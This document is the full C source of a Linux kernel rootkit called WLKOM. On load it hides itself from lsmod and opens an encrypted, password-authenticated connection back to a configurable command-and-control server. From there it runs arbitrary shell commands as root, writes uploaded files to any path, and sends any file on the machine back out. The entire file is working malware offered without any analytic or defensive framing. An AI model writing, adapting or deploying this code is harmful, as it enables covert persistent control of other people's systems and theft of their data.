#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <net/sock.h>

#define RETRY_DELAY 3
#define AUTH_PREFIX "AUTH "
#define AUTH_PREFIX_LEN (sizeof(AUTH_PREFIX) - 1)
#define AUTH_HASH_LEN 8
#define AUTH_FRAME_LEN (AUTH_PREFIX_LEN + AUTH_HASH_LEN + 1)
#define TMP_OUT_FILE "/tmp/.wlkom_out"
#define TMP_ERR_FILE "/tmp/.wlkom_err"

static char *password_hash = "";
static char *c2_ip    = "192.168.100.10";
static int   c2_port  = 4444;
module_param(password_hash, charp, 0400);
module_param(c2_ip,    charp, 0400);
module_param(c2_port,  int,   0400);
MODULE_PARM_DESC(password_hash, "FNV-1a password hash (required at insmod)");
MODULE_PARM_DESC(c2_ip,    "C2 server IPv4 address");
MODULE_PARM_DESC(c2_port,  "C2 server TCP port");

static struct task_struct *conn_thread = NULL;
static struct socket      *conn_sock   = NULL;
static struct list_head   *module_prev = NULL;
static bool                module_hidden = false;
static u32                 cipher_key = 0;
static u32                 tx_pos = 0;
static u32                 rx_pos = 0;

static void *to_sockaddr(void *ptr) { return ptr; }

static u8 keystream_byte(u32 key, u32 pos)
{
    u32 x = key + pos * 0x9E3779B1U;

    x ^= x >> 16;
    x *= 0x85ebca6bU;
    x ^= x >> 13;
    x *= 0xc2b2ae35U;
    x ^= x >> 16;

    return (u8)x;
}

static void crypt_buffer(char *buf, size_t len, u32 key, u32 *pos)
{
    while (len-- > 0) {
        *buf++ ^= keystream_byte(key, *pos);
        (*pos)++;
    }
}

static int recv_line(char *buf, size_t size)
{
    size_t pos = 0;
    int ret;

    if (size == 0)
        return -EINVAL;

    while (pos + 1 < size && !kthread_should_stop()) {
        struct msghdr msg = { 0 };
        struct kvec vec = {
            .iov_base = &buf[pos],
            .iov_len = 1,
        };

        ret = kernel_recvmsg(conn_sock, &msg, &vec, 1, 1, 0);
        if (ret <= 0)
            return ret;

        crypt_buffer(&buf[pos], 1, cipher_key, &rx_pos);
        if (buf[pos] == '\n') {
            buf[pos] = '\0';
            if (pos > 0 && buf[pos - 1] == '\r')
                buf[pos - 1] = '\0';
            return pos;
        }

        pos++;
    }

    buf[pos] = '\0';
    return -EMSGSIZE;
}

static int recv_exact_decrypted(char *buf, size_t size)
{
    size_t done = 0;

    while (done < size && !kthread_should_stop()) {
        struct msghdr msg = { 0 };
        struct kvec vec = {
            .iov_base = buf + done,
            .iov_len = size - done,
        };
        int ret;

        ret = kernel_recvmsg(conn_sock, &msg, &vec, 1, vec.iov_len, 0);
        if (ret <= 0)
            return ret ? ret : -ECONNRESET;

        crypt_buffer(buf + done, ret, cipher_key, &rx_pos);
        done += ret;
    }

    return done == size ? (int)done : -EINTR;
}

static int recv_auth_frame(char *buf, size_t size)
{
    int ret;

    if (size < AUTH_FRAME_LEN + 1)
        return -EINVAL;

    ret = recv_exact_decrypted(buf, AUTH_FRAME_LEN);
    if (ret < 0)
        return ret;

    buf[AUTH_FRAME_LEN] = '\0';
    return ret;
}

static int send_bytes(const void *data, size_t len)
{
    const char *reply = data;

    while (len > 0) {
        char tmp[256];
        size_t chunk = len < sizeof(tmp) ? len : sizeof(tmp);
        size_t offset = 0;
        u32 pos = tx_pos;

        memcpy(tmp, reply, chunk);
        crypt_buffer(tmp, chunk, cipher_key, &pos);

        while (offset < chunk) {
            struct msghdr msg = { 0 };
            struct kvec vec = {
                .iov_base = tmp + offset,
                .iov_len = chunk - offset,
            };
            int ret;

            ret = kernel_sendmsg(conn_sock, &msg, &vec, 1, vec.iov_len);
            if (ret <= 0)
                return ret ? ret : -ECONNRESET;

            offset += ret;
            tx_pos += ret;
        }

        reply += chunk;
        len -= chunk;
    }

    return 0;
}

static int send_reply(const char *reply)
{
    return send_bytes(reply, strlen(reply));
}

static void hide_module_from_lsmod(void)
{
    if (module_hidden)
        return;

    module_prev = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_hidden = true;
}

static void show_module_in_lsmod(void)
{
    if (!module_hidden)
        return;

    list_add(&THIS_MODULE->list, module_prev);
    module_prev = NULL;
    module_hidden = false;
}

static void send_control_reply(const char *message)
{
    send_reply("[Exit Status: 0]\n");
    send_reply("--- STDOUT ---\n");
    send_reply(message);
    send_reply("--- STDERR ---\n");
    send_reply("--- End of Output ---\n\n");
}

static bool handle_control_command(const char *cmd)
{
    if (strcmp(cmd, "hide_module") == 0) {
        if (module_hidden)
            send_control_reply("wlkom: module already hidden from lsmod\n");
        else {
            hide_module_from_lsmod();
            send_control_reply("wlkom: module hidden from lsmod\n");
        }
        return true;
    }

    if (strcmp(cmd, "unhide_module") == 0) {
        if (!module_hidden)
            send_control_reply("wlkom: module already visible in lsmod\n");
        else {
            show_module_in_lsmod();
            send_control_reply("wlkom: module visible in lsmod\n");
        }
        return true;
    }

    if (strcmp(cmd, "module_status") == 0) {
        if (module_hidden)
            send_control_reply("wlkom: module hidden from lsmod\n");
        else
            send_control_reply("wlkom: module visible in lsmod\n");
        return true;
    }

    return false;
}

static void execute_and_send_output(char *cmd)
{
    char *cmd_redirect;
    char *file_buf;
    char status_header[128];
    struct file *file;
    loff_t pos = 0;
    ssize_t bytes_read;
    int exit_status;

    cmd_redirect = kmalloc(4096, GFP_KERNEL);
    if (!cmd_redirect) {
        send_reply("[Rootkit Error]: kmalloc cmd_redirect failed.\n\n");
        return;
    }
    file_buf = kmalloc(4096, GFP_KERNEL);
    if (!file_buf) {
        send_reply("[Rootkit Error]: kmalloc file_buf failed.\n\n");
        kfree(cmd_redirect);
        return;
    }

    snprintf(cmd_redirect, 4096, "(%s) > " TMP_OUT_FILE " 2>" TMP_ERR_FILE, cmd);

    char *argv[] = { "/bin/sh", "-c", cmd_redirect, NULL };
    static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
        NULL
    };

    
    exit_status = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    int real_exit_code = (exit_status >> 8) & 0xFF;
    
    
    snprintf(status_header, sizeof(status_header), "[Exit Status: %d]\n", real_exit_code);
    send_reply(status_header);

    send_reply("--- STDOUT ---\n");
    file = filp_open(TMP_OUT_FILE, O_RDONLY, 0);
    if (!IS_ERR(file)) {
        while ((bytes_read = kernel_read(file, file_buf, 4095, &pos)) > 0) {
            file_buf[bytes_read] = '\0';
            send_reply(file_buf);
        }
        filp_close(file, NULL);
    }

    pos = 0;
    send_reply("--- STDERR ---\n");
    file = filp_open(TMP_ERR_FILE, O_RDONLY, 0);
    if (!IS_ERR(file)) {
        while ((bytes_read = kernel_read(file, file_buf, 4095, &pos)) > 0) {
            file_buf[bytes_read] = '\0';
            send_reply(file_buf);
        }
        filp_close(file, NULL);
    }

    send_reply("--- End of Output ---\n\n");

    {
        char *rm_out[] = { "/bin/rm", "-f", TMP_OUT_FILE, NULL };
        char *rm_err[] = { "/bin/rm", "-f", TMP_ERR_FILE, NULL };
        call_usermodehelper(rm_out[0], rm_out, envp, UMH_WAIT_PROC);
        call_usermodehelper(rm_err[0], rm_err, envp, UMH_WAIT_PROC);
    }
    kfree(file_buf);
    kfree(cmd_redirect);
}


static void handle_upload(char *cmd)
{
    char filepath[512];
    unsigned long long file_size = 0;
    struct file *file;
    char *filebuf;
    loff_t pos = 0;
    size_t remaining;
    int ret;

    if (sscanf(cmd, "UPLOAD %511s %llu", filepath, &file_size) != 2) {
        send_reply("UPLOAD_FAILED\n");
        return;
    }

    if (file_size > 16 * 1024 * 1024) {
        send_reply("UPLOAD_FAILED\n");
        return;
    }

    send_reply("UPLOAD_READY\n");

    file = filp_open(filepath, O_CREAT | O_WRONLY | O_TRUNC, 0600);
    if (IS_ERR(file)) {
        send_reply("UPLOAD_FAILED\n");
        return;
    }

    filebuf = kmalloc(4096, GFP_KERNEL);
    if (!filebuf) {
        filp_close(file, NULL);
        send_reply("UPLOAD_FAILED\n");
        return;
    }

    remaining = (size_t)file_size;
    pos = 0;
    while (remaining > 0) {
        size_t chunk = remaining < 4096 ? remaining : 4096;

        ret = recv_exact_decrypted(filebuf, chunk);
        if (ret < 0) {
            kfree(filebuf);
            filp_close(file, NULL);
            send_reply("UPLOAD_FAILED\n");
            return;
        }

        if (kernel_write(file, filebuf, chunk, &pos) != (ssize_t)chunk) {
            kfree(filebuf);
            filp_close(file, NULL);
            send_reply("UPLOAD_FAILED\n");
            return;
        }

        remaining -= chunk;
    }

    kfree(filebuf);
    filp_close(file, NULL);
    send_reply("UPLOAD_OK\n");
}

static void handle_download(char *cmd)
{
    char filepath[512];
    struct file *file;
    char *filebuf;
    loff_t pos = 0;
    ssize_t bytes_read;
    char size_msg[64];
    
    if (sscanf(cmd, "DOWNLOAD %511s", filepath) != 1) {
        send_reply("[Rootkit Error]: Invalid DOWNLOAD format.\n\n");
        return;
    }
    
    file = filp_open(filepath, O_RDONLY, 0);
    if (IS_ERR(file)) {
        send_reply("[Rootkit Error]: File not found or cannot be read.\n\n");
        return;
    }
    
    loff_t file_size = i_size_read(file->f_inode);
    
    snprintf(size_msg, sizeof(size_msg), "SIZE %lld\n", (long long)file_size);
    send_reply(size_msg);
    
    filebuf = kmalloc(1024 * 1024, GFP_KERNEL);
    if (!filebuf) {
        send_reply("[Rootkit Error]: kmalloc failed.\n\n");
        filp_close(file, NULL);
        return;
    }
    
    pos = 0;
    while ((bytes_read = kernel_read(file, filebuf, 1024 * 1024, &pos)) > 0) {
        if (send_bytes(filebuf, bytes_read) < 0) {
            pr_debug("wlkom: failed to send file bytes\n");
            break;
        }
    }
    
    filp_close(file, NULL);
    kfree(filebuf);
    
    send_reply("--- End of Output ---\n\n");
}
static int authenticate_c2(void)
{
    char buf[256];
    char *received_hash;
    int ret;

    memset(buf, 0, sizeof(buf));
    ret = recv_auth_frame(buf, sizeof(buf));
    if (ret < 0)
        return ret;

    if (strncmp(buf, AUTH_PREFIX, AUTH_PREFIX_LEN) != 0)
        return -EACCES;
    if (buf[AUTH_PREFIX_LEN + AUTH_HASH_LEN] != '\n')
        return -EACCES;

    buf[AUTH_PREFIX_LEN + AUTH_HASH_LEN] = '\0';

    received_hash = buf + AUTH_PREFIX_LEN;
    if (strcmp(received_hash, password_hash) != 0)
        return -EACCES;

    if (send_reply("AUTH_OK\n") < 0)
        return -EIO;

    return 0;
}

static int do_connect(void)
{
    struct sockaddr_in addr = { 0 };
    unsigned char ip_bin[4] = { 0 };
    int ret;

    if (in4_pton(c2_ip, -1, ip_bin, -1, NULL) == 0) {
        pr_err("wlkom: invalid C2 IP address: %s\n", c2_ip);
        return -EINVAL;
    }

    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &conn_sock);
    if (ret < 0) {
        pr_err("wlkom: sock_create failed: %d\n", ret);
        return ret;
    }

    addr.sin_family = AF_INET;
    addr.sin_port   = htons(c2_port);
    memcpy(&addr.sin_addr.s_addr, ip_bin, sizeof(addr.sin_addr.s_addr));

    ret = conn_sock->ops->connect(conn_sock, to_sockaddr(&addr),
                                  sizeof(addr), 0);
    if (ret < 0) {
        sock_release(conn_sock);
        conn_sock = NULL;
        return ret;
    }

    return 0;
}

static int connection_thread(void *data)
{
    char buf[256];
    int  ret;

    while (!kthread_should_stop()) {
        ret = do_connect();
        if (ret < 0) {
            pr_debug("wlkom: C2 unreachable (%d), retry in %ds\n",
                     ret, RETRY_DELAY);
            schedule_timeout_interruptible(HZ * RETRY_DELAY);
            continue;
        }

        tx_pos = 0;
        rx_pos = 0;

        pr_debug("wlkom: connected to C2 %s:%d\n", c2_ip, c2_port);

        ret = authenticate_c2();
        if (ret < 0) {
            pr_debug("wlkom: C2 authentication failed (%d)\n", ret);
            goto disconnect;
        }

        pr_debug("wlkom: C2 authenticated\n");

        while (!kthread_should_stop()) {
            memset(buf, 0, sizeof(buf));
            ret = recv_line(buf, sizeof(buf));
            if (ret <= 0)
                break;

            if (strlen(buf) == 0)
                continue;

            if (handle_control_command(buf))
                continue;

            if (strncmp(buf, "DOWNLOAD ", 9) == 0) {
                handle_download(buf);
                continue;
            }

            if (strncmp(buf, "UPLOAD ", 7) == 0) {
                handle_upload(buf);
                continue;
            }

            /* Handle processing, capturing and network streaming internally */
            execute_and_send_output(buf);
        }

disconnect:
        kernel_sock_shutdown(conn_sock, SHUT_RDWR);
        sock_release(conn_sock);
        conn_sock = NULL;
        pr_debug("wlkom: disconnected from C2, retry in %ds\n", RETRY_DELAY);
        schedule_timeout_interruptible(HZ * RETRY_DELAY);
    }

    return 0;
}

static int __init wlkom_init(void)
{
    if (!password_hash || password_hash[0] == '\0') {
        pr_err("wlkom: password_hash required (insmod wlkom.ko password_hash=...)\n");
        return -EINVAL;
    }

    if (kstrtouint(password_hash, 16, &cipher_key) < 0) {
        pr_err("wlkom: invalid password_hash format\n");
        return -EINVAL;
    }

    pr_debug("wlkom: loaded\n");
    hide_module_from_lsmod();

    conn_thread = kthread_run(connection_thread, NULL, "wlkom_conn");
    if (IS_ERR(conn_thread)) {
        pr_err("wlkom: failed to create connection thread\n");
        conn_thread = NULL;
        return -ENOMEM;
    }

    return 0;
}

static void __exit wlkom_exit(void)
{
    if (conn_sock)
        kernel_sock_shutdown(conn_sock, SHUT_RDWR);

    if (conn_thread)
        kthread_stop(conn_thread);

    if (conn_sock) {
        sock_release(conn_sock);
        conn_sock = NULL;
    }

    show_module_in_lsmod();

    pr_debug("wlkom: unloaded\n");
}

module_init(wlkom_init);
module_exit(wlkom_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("WLKOM - Wild Linux Kernel Object Module");
MODULE_AUTHOR("NMT");
